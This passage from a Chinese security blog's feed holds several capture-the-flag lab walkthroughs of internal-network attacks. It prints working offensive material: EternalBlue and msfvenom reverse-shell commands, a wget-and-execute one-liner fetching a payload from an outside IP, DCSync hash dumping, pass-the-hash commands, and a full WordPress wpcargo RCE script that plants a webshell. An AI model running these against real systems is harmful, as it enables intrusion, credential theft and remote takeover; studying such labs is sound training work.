    <content type="html"><![CDATA[<p>这个靶机比较特殊  他是由三部分的flag组成一个完整的flag</p><p><img src="../images/image-20231006183707297.png" alt="image-20231006183707297"></p><p>漏洞都给扫出来了 直接去打就行了</p><p><img src="../images/image-20231006184027853.png" alt="image-20231006184027853"></p><p>直接去写马  然后反弹shell</p><p><img src="../images/image-20231006184318407.png" alt="image-20231006184318407"></p><p><img src="../images/image-20231006184327154.png" alt="image-20231006184327154"></p><p>然后sudo -l 发现了这个mysql可以利用来提权</p><p><img src="../images/image-20231006184416198.png" alt="image-20231006184416198"></p><p><img src="../images/image-20231006184457584.png" alt="image-20231006184457584"></p><p><img src="../images/image-20231006184514890.png" alt="image-20231006184514890"></p><p>上传个fscan扫一下内网</p><p><img src="../images/image-20231006185041206.png" alt="image-20231006185041206"></p><p>整理一下信息</p><blockquote><p>172.22.1.2  DC域控主机</p><p>172.22.1.15  外网主机  getshell</p><p>172.22.1.18   3306  OA系统</p><p>172.22.1.21  域内主机  MS17  永恒之蓝</p></blockquote><p>先给这个linux主机上msf先  </p><p><img src="../images/image-20231006185355983.png" alt="image-20231006185355983"></p><p>成功上线</p><p>然后去使用stowaway挂个代理</p><p><img src="../images/image-20231006190449700.png" alt="image-20231006190449700"></p><p>既然说这个21这个台主机存在<strong>MS17</strong></p><p>这里的话我是用kali下的msf打的  服务器上的话不知道为啥老是失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid  //这个是个关键了 可以配合proxychains4本地使用</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>如果要是再服务器上用的话要加上route add xxxx</p><p><img src="../images/image-20231006190643419.png" alt="image-20231006190643419"></p><p>成功上线这台域内主机  还是system权限</p><p>然后上传个<code>sharphound.exe</code>进去分析一下域内环境</p><p><img src="../images/image-20231006190804985.png" alt="image-20231006190804985"></p><p>发现这个机器对域控有DCSync权限  于是我们导出域内所有人的hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231006191007593.png" alt="image-20231006191007593"></p><p>拿到了域管的hash值  那么直接pth攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">hash传递攻击的几种方法  (其原理都是使用smb服务来进行攻击)</span><br><span class="line"></span><br><span class="line">psexec.py</span><br><span class="line"></span><br><span class="line">proxychains4 python psexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/administrator@172.22.1.2</span><br><span class="line"></span><br><span class="line">-hashes: 域管hash值 dscyn获取</span><br><span class="line">xiaorang.lab  域名</span><br><span class="line">administrator 域管账户</span><br><span class="line">172.22.1.2 域控账户</span><br><span class="line"></span><br><span class="line">wmiexec.py</span><br><span class="line"></span><br><span class="line">proxychains4 python wmiexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/administrator@172.22.1.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">crackmapexec  (这种是不能进入shell命令行的 )</span><br><span class="line"></span><br><span class="line">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">impacket-wmiexec </span><br><span class="line"></span><br><span class="line">proxychains4 impacket-wmiexec xiaorang.lab/administrator@172.22.1.18 -hashes :10cf89a850fb1cdbe6bb432b859164c8</span><br></pre></td></tr></table></figure><p><strong>这就是使用pth攻击的几种方法  这里就打完了  拿着域管的hash去登录另一台机器就行了  (OA)</strong></p><p>(上面工具原理就是基于这个<strong>SMB服务</strong>   <strong>445端口</strong>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个靶机比较特殊  他是由三部分的flag组成一个完整的flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231006183707297.png&quot; alt=&quot;image-20231006183707297&quot;&gt;&lt;/p&gt;
&lt;p&gt;漏洞都给扫出来了 直</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Msf反弹shell与不出网主机上线</title>
    <link href="https://ke1nys.github.io/posts/af4fc312.html"/>
    <id>https://ke1nys.github.io/posts/af4fc312.html</id>
    <published>2023-10-04T13:29:20.000Z</published>
    <updated>2023-10-09T14:05:19.749Z</updated>
    
    <content type="html"><![CDATA[<p>这里用这个春秋云镜的Certify靶机举例子</p><p><strong>使用这里的前提是先反弹shell到我们的vps上</strong></p><p>先使用web_delivery这模块来进行监听</p><p><img src="../images/image-20231004213357075.png" alt="image-20231004213357075"></p><p><img src="../images/image-20231004213438149.png" alt="image-20231004213438149"></p><p>把这几个地方配置好  然后run运行  我们就会的到一个命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO 2yheDLvT --no-check-certificate http://101.42.39.110:1234/605OcaF; chmod +x 2yheDLvT; ./2yheDLvT&amp; disown</span><br></pre></td></tr></table></figure><p>然后到tmp目录下进行运行</p><p><img src="../images/image-20231004213603113.png" alt="image-20231004213603113"></p><p>然后我们的这个web_delivery这个模块就可以监听到反弹的shell</p><p>然后查看内网ip</p><p>设置route</p><p><img src="../images/image-20231004213819118.png" alt="image-20231004213819118"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">图中写错了 </span><br><span class="line">应该是 route add 172.22.9.0 255.255.0.0 1   不用set</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>(前面的172.22.9.0是内网ip  然后255.255.0.0  后面跟着的是session的id)</strong></p><p><img src="../images/image-20231004213924480.png" alt="image-20231004213924480"></p><p>然后再使用msfvenom来生成windows的exe文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.2.7 LPORT=9002 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>这里的Lhost就是我们getshell的linux机器</p><p>然后我们使用   exploit/multi/handler 进行监听windows机器反弹的shell</p><p><img src="../images/image-20231004214103299.png" alt="image-20231004214103299"></p><p>然后设置paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231004214247968.png" alt="image-20231004214247968"></p><p>然后把这两个设置好  把刚刚生成的exe文件丢到这个内网windows主机里运行就行了  这里怎么访问这个主机呢  得自己设置代理  我就不讲了这里</p><p><strong>这里不用route add xxxxxx其实也可以</strong></p><p>这里的有个别的骚方法就是使用proxychains msfconsole</p><p>这里的话就可以替代这个route add xxxx了</p><p>如果是服务器上没有msf的话 也没关系  我们在kali使用bind_tcp效果是一样的 <strong>(就是替代reverse_tcp)</strong></p><p>这里还有一种方法是使用 <a href="https://github.com/ph4ntonn/Stowaway">Stowaway</a></p><p><strong>使用方法的话我写在这个端口转发那篇这里</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里用这个春秋云镜的Certify靶机举例子&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用这里的前提是先反弹shell到我们的vps上&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先使用web_delivery这模块来进行监听&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-2</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Potato家族本地提权</title>
    <link href="https://ke1nys.github.io/posts/7a8168b7.html"/>
    <id>https://ke1nys.github.io/posts/7a8168b7.html</id>
    <published>2023-10-03T06:31:23.000Z</published>
    <updated>2023-10-07T14:29:22.115Z</updated>
    
    <content type="html"><![CDATA[<p>占个坑位   来记录一下这个Potato提权</p><p><strong>(这个提权的话主要就是针对这个windows服务账户的提权)</strong></p><p><a href="https://www.freebuf.com/articles/web/256360.html">https://www.freebuf.com/articles/web/256360.html</a>    文章1</p><p><a href="https://xz.aliyun.com/t/7776/">https://xz.aliyun.com/t/7776/</a>  文章2</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;占个坑位   来记录一下这个Potato提权&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(这个提权的话主要就是针对这个windows服务账户的提权)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/256360</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Brute4Road</title>
    <link href="https://ke1nys.github.io/posts/989b194c.html"/>
    <id>https://ke1nys.github.io/posts/989b194c.html</id>
    <published>2023-10-02T12:08:19.000Z</published>
    <updated>2023-10-07T14:29:22.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>fscan开扫 </p><p><img src="../images/image-20231002201316156.png" alt="image-20231002201316156"></p><p>80端口没啥用  就一个centos   然后就是ftp的匿名登录  看了一下也没啥  直接就去看redis这个未授权了</p><p>这里的话创建文件的话是没有权限  所以我们尝试去使用工具来进行反弹shell  <strong>(<a href="https://github.com/n0b0dyCN/redis-rogue-server">主从复制RCE</a>)</strong></p><p><img src="../images/image-20231002202320251.png" alt="image-20231002202320251"></p><blockquote><p>./redis-rogue-server.py —rhost 39.99.136.166 —lhost xx.xx.xxx.xxx</p></blockquote><p>因为这个命令太难看了  所以使用python交互一下</p><p>​    <img src="../images/image-20231002202440595.png" alt="image-20231002202440595"></p><p>想读取flag发现没有权限</p><p><img src="../images/image-20231002202526060.png" alt="image-20231002202526060"></p><p>然后就去尝试提权操作</p><p><strong>还是三个方法挨个试(suid sudo 内核)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231002202730230.png" alt="image-20231002202730230"></p><p>觉得这个base64很眼熟  于是上网站上找一下</p><p><img src="../images/image-20231002202817191.png" alt="image-20231002202817191"></p><p><img src="../images/image-20231002202908054.png" alt="image-20231002202908054"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>先查看内网ip</p><p><img src="../images/image-20231002203044113.png" alt="image-20231002203044113"></p><p>发现没有这个命令  于是上传<a href="https://github.com/cdk-team/CDK">cdk</a>上去执行</p><p><img src="../images/image-20231002204121390.png" alt="image-20231002204121390"></p><p>上传fscan扫描内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">172.22.2.3   域控  win</span><br><span class="line"></span><br><span class="line">172.22.2.7   ---&gt; 这是getshell的linux机器</span><br><span class="line"></span><br><span class="line">172.22.2.16  mssqlserver win</span><br><span class="line"></span><br><span class="line">172.22.2.18  web02 ubuntu  wordpress</span><br><span class="line"></span><br><span class="line">172.22.2.34  client01/域内机器</span><br></pre></td></tr></table></figure><p>整理收集到的信息   看到了这个wordpress这个东西   老样子直接拿<code>wpscan</code>老扫</p><p><strong>先去搭建隧道  (还是使用chisel   这里就不多写了)</strong></p><p><img src="../images/image-20231002204926138.png" alt="image-20231002204926138"></p><p>搭建成功  开扫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[+] URL: http://172.22.2.18/ [172.22.2.18]</span><br><span class="line">[+] Started: Mon Oct  2 20:50:32 2023</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://172.22.2.18/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://172.22.2.18/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://172.22.2.18/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://172.22.2.18/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://172.22.2.18/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;</span><br><span class="line"> |  - http://172.22.2.18/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwentytwo</span><br><span class="line"> | Location: http://172.22.2.18/wp-content/themes/twentytwentytwo/</span><br><span class="line"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="line"> | Readme: http://172.22.2.18/wp-content/themes/twentytwentytwo/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.4</span><br><span class="line"> | Style URL: http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2</span><br><span class="line"> | Style Name: Twenty Twenty-Two</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwentytwo/</span><br><span class="line"> | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] wpcargo</span><br><span class="line"> | Location: http://172.22.2.18/wp-content/plugins/wpcargo/</span><br><span class="line"> | Last Updated: 2023-08-26T14:28:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 6.13.3</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 6.x.x (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK                                                      &gt; (0 / 137)  0.00%  ETA: ??:??:??</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK                                                     &gt; (19 / 137) 13.86%  ETA: 00:00:05</span><br><span class="line">[proxychains] Strict chain  ...  101.42.39.110:7777  ...  172.22.2.18:80  ...  OK                                                     &gt; (40 / 137) 29.19%  ETA: 00:00:03</span><br><span class="line"> Checking Config Backups - Time: 00:00:02 &lt;=========================================================================================&gt; (137 / 137) 100.00% Time: 00:00:02</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Oct  2 20:50:48 2023</span><br><span class="line">[+] Requests Done: 172</span><br><span class="line">[+] Cached Requests: 5</span><br><span class="line">[+] Data Sent: 42.632 KB</span><br><span class="line">[+] Data Received: 250.835 KB</span><br><span class="line">[+] Memory used: 263.754 MB</span><br><span class="line">[+] Elapsed time: 00:00:16</span><br></pre></td></tr></table></figure><p>wordpress 一般都是先从插件入手, 实在不行了再去爆破用户名密码</p><p>wpcargo 插件存在未授权 RCE, exp 如下</p><p><a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a">https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># This is a magic string that when treated as pixels and compressed using the png</span><br><span class="line"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span><br><span class="line">payload = &#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span><br><span class="line"></span><br><span class="line">def encode_character_code(c: int):</span><br><span class="line">    return &#x27;&#123;:08b&#125;&#x27;.format(c).replace(&#x27;0&#x27;, &#x27;x&#x27;)</span><br><span class="line"></span><br><span class="line">text = &#x27;&#x27;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]</span><br><span class="line"></span><br><span class="line">destination_url = &#x27;http://172.22.2.18/&#x27;</span><br><span class="line">cmd = &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span><br><span class="line">requests.get(</span><br><span class="line">    f&quot;&#123;destination_url&#125;wp-content/plugins/wpcargo/includes/barcode.php?text=&#123;text&#125;&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span><br><span class="line">print(requests.post(</span><br><span class="line">    f&quot;&#123;destination_url&#125;webshell.php?1=system&quot;, data=&#123;&quot;2&quot;: cmd&#125;</span><br><span class="line">).content.decode(&#x27;ascii&#x27;, &#x27;ignore&#x27;))</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231002205425378.png" alt="image-20231002205425378"></p><p>这里记得写马进去  才去连接</p><p><img src="../images/image-20231002210235208.png" alt="image-20231002210235208"></p><p>蚁剑尝试进行连接</p><p><img src="../images/image-20231002210153422.png" alt="image-20231002210153422"></p><p><code>ps -aux</code>  的话发现运行了smb这个服务  但是这里感觉没啥用  就去查看配置文件</p><p><img src="../images/image-20231002210316560.png" alt="image-20231002210316560"></p><p>查看wordpress的配置文件发现了这个数据账号密码</p><p><code>netstat -anl</code>进行查看</p><p><img src="../images/image-20231002210655743.png" alt="image-20231002210655743"></p><p>发现只有本地用户才能访问这个数据库  那么就得在挂一层代理了  但是这里的话我们使用<code>adminer.php</code>这个方法</p><p>下载下来上传到<code>html</code>这个目录下</p><p><img src="../images/image-20231002211020823.png" alt="image-20231002211020823"></p><p>然后直接去访问</p><p>登录成功后  切换数据库</p><p><img src="../images/image-20231002211136394.png" alt="image-20231002211136394"></p><p><img src="../images/image-20231002211232987.png" alt="image-20231002211232987"></p><p>找到第二个flag  然后第二表的名字很有意思</p><p><img src="../images/image-20231002211333708.png" alt="image-20231002211333708"></p><p>列名是密码  那么我们导出全部数据</p><p>然后复制内容到这个1.txt中</p><p>使用python脚本将密码给提取出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">filename = &quot;1.txt&quot;</span><br><span class="line">output_filename = &quot;pass.txt&quot;</span><br><span class="line"></span><br><span class="line"># 从文件中读取数据</span><br><span class="line">with open(filename, &quot;r&quot;) as file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line"></span><br><span class="line"># 使用正则表达式提取字符串</span><br><span class="line">pattern = r&quot;&#x27;(.*?)&#x27;&quot;</span><br><span class="line">strings = [re.findall(pattern, item)[0] for item in data]</span><br><span class="line"></span><br><span class="line"># 将结果输出到文件</span><br><span class="line">with open(output_filename, &quot;w&quot;) as file:</span><br><span class="line">    for string in strings:</span><br><span class="line">        file.write(string + &quot;\n&quot;)</span><br></pre></td></tr></table></figure><p>结合我们刚开始收集到的信息   172.22.2.16这个ip使用windwos主机来当服务器来设置了mssql  并且开启了1433端口  并且我们前面还收集到了 这smb这个服务  于是我们使用上面获取的密码进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64  -h 172.22.2.0/24 -m smb -pwdf pass.txt</span><br><span class="line">./fscan_amd64  -h 172.22.2.0/24 -m mssql -pwdf pass.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64  -h 172.22.2.0/24 -m smb -pwdf pass.txt</span><br><span class="line"></span><br><span class="line">___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">-m  smb  start scan the port: 445</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.2.3      is alive</span><br><span class="line">(icmp) Target 172.22.2.7      is alive</span><br><span class="line">(icmp) Target 172.22.2.16     is alive</span><br><span class="line">(icmp) Target 172.22.2.18     is alive</span><br><span class="line">(icmp) Target 172.22.2.34     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.2.3:445 open</span><br><span class="line">172.22.2.34:445 open</span><br><span class="line">172.22.2.16:445 open</span><br><span class="line">172.22.2.18:445 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[+] SMB:172.22.2.18:445:administrator pAssw0rd</span><br><span class="line">[+] SMB:172.22.2.16:445:admin pAssw0rd</span><br><span class="line">已完成 4/4</span><br></pre></td></tr></table></figure><p>扫描完这个smb的话  登录上去发现没啥用<strong>(是空的)</strong>   于是尝试去扫这个 <code>mssql</code>服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 